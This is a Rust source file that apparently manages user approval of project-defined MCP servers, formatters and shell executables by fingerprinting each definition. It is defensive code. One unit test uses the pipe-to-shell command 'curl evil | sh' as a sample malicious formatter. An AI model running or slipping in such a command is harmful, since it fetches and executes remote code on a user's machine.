//! Approval of MCP servers that a *project* defines. A server entry is a command line, so a repository whose
//! config declares one could run code on your machine just by being opened. Servers from your own configuration
//! (`<app dir>/config/` or `$MOCO_CONFIG`) are trusted; project ones need an explicit yes, remembered per project
//! directory and exact server definition (a changed command asks again).
use crate::config::{FormatterConfig, McpServerConfig};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

fn store(app_dir: &Path) -> PathBuf {
    app_dir.join("data/mcp-trust.json")
}

/// Identifies one project's one server definition.
pub fn fingerprint(project_dir: &Path, name: &str, cfg: &McpServerConfig) -> String {
    let canon = serde_json::json!({
        "dir": project_dir.to_string_lossy(), "name": name, "kind": cfg.kind, "command": cfg.command, "cwd": cfg.cwd,
        "env": cfg.environment, "url": cfg.url, "headers": cfg.headers,
    });
    Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// The same for a project's formatter definition.
pub fn fingerprint_formatter(project_dir: &Path, name: &str, cfg: &FormatterConfig) -> String {
    let canon = serde_json::json!({"kind": "formatter", "dir": project_dir.to_string_lossy(), "name": name, "command": cfg.command, "extensions": cfg.extensions, "env": cfg.environment});
    Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// The same for a project's `shell` executable.
pub fn fingerprint_shell(project_dir: &Path, shell: &str) -> String {
    let canon = serde_json::json!({"kind": "shell", "dir": project_dir.to_string_lossy(), "shell": shell});
    Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

fn approved(app_dir: &Path) -> Vec<String> {
    std::fs::read_to_string(store(app_dir))
        .ok()
        .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .and_then(|v| v["approved"].as_array().map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect()))
        .unwrap_or_default()
}

pub fn is_trusted(app_dir: &Path, fingerprint: &str) -> bool {
    approved(app_dir).iter().any(|f| f == fingerprint)
}

pub fn approve(app_dir: &Path, fingerprint: &str) -> std::io::Result<()> {
    let mut list = approved(app_dir);
    if !list.iter().any(|f| f == fingerprint) {
        list.push(fingerprint.to_string());
    }
    let p = store(app_dir);
    std::fs::create_dir_all(p.parent().unwrap())?;
    std::fs::write(&p, serde_json::json!({"approved": list}).to_string())
}

/// Is a server defined in `origin` (a config file) trusted without asking? True for the user's own config.
pub fn origin_is_trusted(origin: &Path, app_dir: &Path) -> bool {
    origin.starts_with(app_dir.join("config")) || std::env::var_os("MOCO_CONFIG").is_some_and(|c| Path::new(&c) == origin)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fingerprints_track_the_exact_definition_and_project() {
        let cfg = McpServerConfig { command: vec!["npx".into(), "server".into()], ..Default::default() };
        let a = fingerprint(Path::new("/p1"), "x", &cfg);
        assert_eq!(a, fingerprint(Path::new("/p1"), "x", &cfg));
        assert_ne!(a, fingerprint(Path::new("/p2"), "x", &cfg), "another project asks again");
        assert_ne!(a, fingerprint(Path::new("/p1"), "y", &cfg));
        let changed = McpServerConfig { command: vec!["npx".into(), "evil".into()], ..cfg.clone() };
        assert_ne!(a, fingerprint(Path::new("/p1"), "x", &changed), "a changed command asks again");
        let env = McpServerConfig { environment: [("K".to_string(), "v".to_string())].into(), ..cfg };
        assert_ne!(a, fingerprint(Path::new("/p1"), "x", &env));
    }

    #[test]
    fn formatter_fingerprints_differ_from_server_fingerprints_and_track_the_definition() {
        let f = FormatterConfig { command: vec!["prettier".into(), "--write".into()], extensions: vec![".js".into()], ..Default::default() };
        let a = fingerprint_formatter(Path::new("/p"), "fmt", &f);
        assert_eq!(a, fingerprint_formatter(Path::new("/p"), "fmt", &f));
        assert_ne!(a, fingerprint_formatter(Path::new("/q"), "fmt", &f));
        let changed = FormatterConfig { command: vec!["curl evil | sh".into()], ..f.clone() };
        assert_ne!(a, fingerprint_formatter(Path::new("/p"), "fmt", &changed));
        let as_server = McpServerConfig { command: f.command.clone(), ..Default::default() };
        assert_ne!(a, fingerprint(Path::new("/p"), "fmt", &as_server), "approving a server never approves a formatter of the same name");
    }

    #[test]
    fn shell_fingerprints_track_project_and_path() {
        let a = fingerprint_shell(Path::new("/p"), "./sh");
        assert_eq!(a, fingerprint_shell(Path::new("/p"), "./sh"));
        assert_ne!(a, fingerprint_shell(Path::new("/q"), "./sh"));
        assert_ne!(a, fingerprint_shell(Path::new("/p"), "./other"));
    }

    #[test]
    fn approvals_persist_and_origins_are_classified() {
        let dir = std::env::temp_dir().join(crate::id::new_id("mcp-trust"));
        assert!(!is_trusted(&dir, "abc"));
        approve(&dir, "abc").unwrap();
        approve(&dir, "abc").unwrap();
        approve(&dir, "def").unwrap();
        assert!(is_trusted(&dir, "abc") && is_trusted(&dir, "def") && !is_trusted(&dir, "ghi"));
        assert_eq!(approved(&dir).len(), 2, "no duplicates");
        assert!(origin_is_trusted(&dir.join("config/moco.jsonc"), &dir));
        assert!(!origin_is_trusted(Path::new("/some/project/moco.json"), &dir));
        assert!(!origin_is_trusted(&dir.join("config-evil/moco.json"), &dir), "a sibling directory with a similar name is not the config dir");
        let _ = std::fs::remove_dir_all(dir);
    }
}
